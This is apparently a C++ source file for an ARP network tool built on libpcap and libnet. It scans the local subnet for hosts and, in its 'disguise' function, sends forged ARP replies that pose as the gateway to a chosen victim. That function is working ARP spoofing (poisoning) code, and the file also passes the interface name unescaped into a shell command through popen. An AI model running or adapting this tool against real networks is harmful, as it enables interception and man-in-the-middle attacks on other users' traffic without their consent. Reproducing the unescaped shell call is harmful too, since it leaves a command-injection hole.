#include <stdint.h>
#include "xyarp.h"

extern "C" const char * xynet_version(){
    return XYNET_VERSION;
}

int xyarp_scan_interface
(pcap_if_t * in){
    printf("Start scanning interface %s...\n", in->name);
    //获得in上的地址
    for(auto a = in->addresses; a; a = a->next){
        if(a->addr->sa_family == AF_INET){
            auto addr = (struct sockaddr_in *)a->addr;
            auto netmask = (struct sockaddr_in *)a->netmask;
            auto broadaddr = (struct sockaddr_in *)a->broadaddr;
            auto dstaddr = (struct sockaddr_in *)a->dstaddr;
            auto start = ntohl(addr->sin_addr.s_addr) & ntohl(netmask->sin_addr.s_addr);
            auto end = (ntohl(addr->sin_addr.s_addr) | ~ntohl(netmask->sin_addr.s_addr));
            printf("Local IP: %s\n", inet_ntoa(addr->sin_addr));
            //printf("Netmask: %s\n", inet_ntoa(netmask->sin_addr));
            // Mac
            //查询本机Mac
            struct sockaddr_in gateway;
            gateway.sin_addr.s_addr = htonl(start + 1);
            //printf("Gateway: %s\n", inet_ntoa(gateway.sin_addr));
            u_int8_t mac[6] = {0};
            xyarp_local_mac(in->name, mac);
            printf("Local MAC: %s\n", XYTOOLS::mac2str(mac).c_str());
            u_int8_t void_mac[6] = {0};
            xyarp_request_arp(in, 
            &gateway.sin_addr,
            &addr->sin_addr,
            mac);
            //
            for(int i = 0; i < 3; i++){
                for(uint32_t i = start; i <= end; i++){
                    struct in_addr ip;
                    ip.s_addr = htonl(i);
                    if(ip.s_addr == addr->sin_addr.s_addr){
                        continue;
                    }
                    xyarp_request_arp(in, &ip, &addr->sin_addr, mac);
                }
                sleep(1);
            }
            
        }
    }
    printf("--------------------\n");
    const auto ArpTables = &init.getNetworkDevices();
    printf("Scanned %ld machines:\n", ArpTables->size());
    for(auto &d : *ArpTables){
        //printf("IP: %s\n", d.first.c_str());
        unsigned char * mac = (unsigned char *)&d.second.mac;
        //printf("MAC: %s\n", XYTOOLS::mac2str(mac).c_str());
        printf("%s at (%s)\n", d.first.c_str(), XYTOOLS::mac2str(mac).c_str());
    }
    return 0;
}

int xyarp_listen_arp
(pcap_if_t * in, _init * init)
{
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle = pcap_open_live(in->name, BUFSIZ, 1, 1000, errbuf);
    if(handle == NULL){
        eprintf("Error: %s\n", errbuf);
        return 1;
    }
    struct pcap_pkthdr header;
    const u_char *packet;
    while(true){
        packet = pcap_next(handle, &header);
        if(packet == NULL){
            continue;
        }
        struct libnet_ethernet_hdr * eth = (struct libnet_ethernet_hdr *)packet;
        if(ntohs(eth->ether_type) == ETHERTYPE_ARP){
            struct libnet_arp_hdr * arp = (struct libnet_arp_hdr *)(packet + sizeof(struct libnet_ethernet_hdr));
            
            if(ntohs(arp->ar_op) == ARPOP_REQUEST){
                //printf("ARP Request\n");
            }else if(ntohs(arp->ar_op) == ARPOP_REPLY){
                // 读取packet内容
                auto ArpTables = &init->getNetworkDevices();
                auto start = (unsigned char *)(packet + sizeof(struct libnet_ethernet_hdr) + sizeof(struct libnet_arp_hdr));
                auto * mac = start;
                //char src_mac_c[18];
                //snprintf(src_mac_c, 18, "%02x:%02x:%02x:%02x:%02x:%02x", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
                struct in_addr * ip = (struct in_addr *)(start + 6);
                //printf("ARP Reply from %s\n", inet_ntoa(*ip));
                std::string src_ip(inet_ntoa(*ip));
                ArpTables->operator[](src_ip).ipv4 = *(int32_t *)ip;
                memcpy((void *)&ArpTables->operator[](src_ip).mac, mac, 6 * sizeof(u_int8_t));
            }
        }
    }
    return 0;
}

int xyarp_request_arp
(pcap_if_t * in, struct in_addr * req_ip, struct in_addr * src_ip, u_int8_t * src_mac)
{
    char errbuf[LIBNET_ERRBUF_SIZE] = {0};
    libnet_t * handle = libnet_init(LIBNET_LINK, in->name, errbuf);
    if(handle == NULL){
        eprintf("Error: %s\n", errbuf);
        return 1;
    }
    //printf("Requesting ARP for %s\n", inet_ntoa(*req_ip));
    u_int8_t broadcast_mac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
    u_int8_t void_mac[6] = {0};
    auto arp_tag = libnet_build_arp(
        ARPHRD_ETHER, 
        ETHERTYPE_IP, 
        6, 4, 
        ARPOP_REQUEST, 
        src_mac,
        (u_int8_t *)&src_ip->s_addr,
        void_mac,
        (u_int8_t *)&req_ip->s_addr, 
        NULL, 0, handle, 0
    );
    if(arp_tag == -1){
        eprintf("Error: %s\n", libnet_geterror(handle));
        return 1;
    }
    auto eth_tag = libnet_build_ethernet(
        broadcast_mac,
        src_mac,
        ETHERTYPE_ARP,
        NULL, 0, handle, 0
    );
    if(eth_tag == -1){
        eprintf("Error: %s\n", libnet_geterror(handle));
        return 1;
    }
    
    if(libnet_write(handle) == -1){
        eprintf("Error: %s\n", libnet_geterror(handle));
        return 1;
    }
    libnet_destroy(handle);
    return 0;
}

int xyarp_local_mac(const char *eth_inf, u_int8_t * mac)
{
    char cmd[64]={0};
    snprintf(cmd, 63, "ifconfig %s | grep ether | awk '{print($2)}'", eth_inf);
    auto fp = popen(cmd, "r");
    if(fp == NULL){
        eprintf("Error: %s\n", strerror(errno));
        return 1;
    }
    char buffer[32]={0};
    if(fgets(buffer, 18, fp) == NULL){
        eprintf("Error: %s\n", strerror(errno));
        return 1;
    }
    pclose(fp);
    XYTOOLS::str2mac(buffer, mac);
    return 0;
}

int xyarp_reply_arp
(pcap_if_t * in, struct in_addr * dst_ip, struct in_addr * src_ip, u_int8_t * src_mac, u_int8_t * dst_mac)
{
    //printf("Replying ARP from %s\n", inet_ntoa(*src_ip));
    char errbuf[LIBNET_ERRBUF_SIZE] = {0};
    libnet_t * handle = libnet_init(LIBNET_LINK, in->name, errbuf);
    if(handle == NULL){
        eprintf("Error: %s\n", errbuf);
        return 1;
    }
    //printf("Replying ARP for %s\n", inet_ntoa(*dst_ip));
    
    auto arp_tag = libnet_build_arp(
        ARPHRD_ETHER, 
        ETHERTYPE_IP, 
        6, 4, 
        ARPOP_REPLY, 
        src_mac,
        (u_int8_t *)&src_ip->s_addr,
        dst_mac,
        (u_int8_t *)&dst_ip->s_addr, 
        NULL, 0, handle, 0
    );
    if(arp_tag == -1){
        eprintf("Error: %s\n", libnet_geterror(handle));
        return 1;
    }
    auto eth_tag = libnet_build_ethernet(
        dst_mac,
        src_mac,
        ETHERTYPE_ARP,
        NULL, 0, handle, 0
    );
    if(eth_tag == -1){
        eprintf("Error: %s\n", libnet_geterror(handle));
        return 1;
    }

    if(libnet_write(handle) == -1){
        eprintf("Error: %s\n", libnet_geterror(handle));
        return 1;
    }

    libnet_destroy(handle);
    return 0;
}

int xyarp_disguise_arp
(pcap_if_t * in, const char * victim_ip, const char * gateway_ip, 
_init * init, const char * victim_mac)
{
    printf("Attacking %s as %s...\n", victim_ip, gateway_ip);
    for (auto a = in->addresses; a; a = a->next){
        if(a->addr->sa_family == AF_INET){
            auto addr = (struct sockaddr_in *)a->addr;
            auto netmask = (struct sockaddr_in *)a->netmask;
            auto src_ip = addr->sin_addr;
            
            struct in_addr dst_ip={0};
            struct in_addr gateway={0};
            if(inet_aton(victim_ip, &dst_ip) == 0){
                eprintf("Error: invalid IP address\n");
                return 1;
            }
            if(inet_aton(gateway_ip, &gateway) == 0){
                eprintf("Error: invalid IP address\n");
                return 1;
            }

            auto ArpTables = &init->getNetworkDevices();
            u_int8_t mac[10] = {0};
            u_int8_t dst_mac[10] = {0};

            xyarp_local_mac(in->name, mac);
            if(ArpTables->find(victim_ip) == ArpTables->end()){
                xyarp_request_arp(in, &dst_ip, &src_ip, mac);
                sleep(1);
            }
            auto it = ArpTables->find(victim_ip);
            if(victim_mac == NULL){
                if(it == ArpTables->end()){
                    eprintf("Error: Host %s not found\n", victim_ip);
                    return 1;
                }else{
                    memcpy(&dst_mac, it->second.mac, 6 * sizeof(u_int8_t));
                }
            }else{
                XYTOOLS::str2mac(victim_mac, dst_mac);
            }
            
            xyarp_reply_arp(in, &dst_ip, &gateway, mac, dst_mac);
        }
    }
    return 0;
}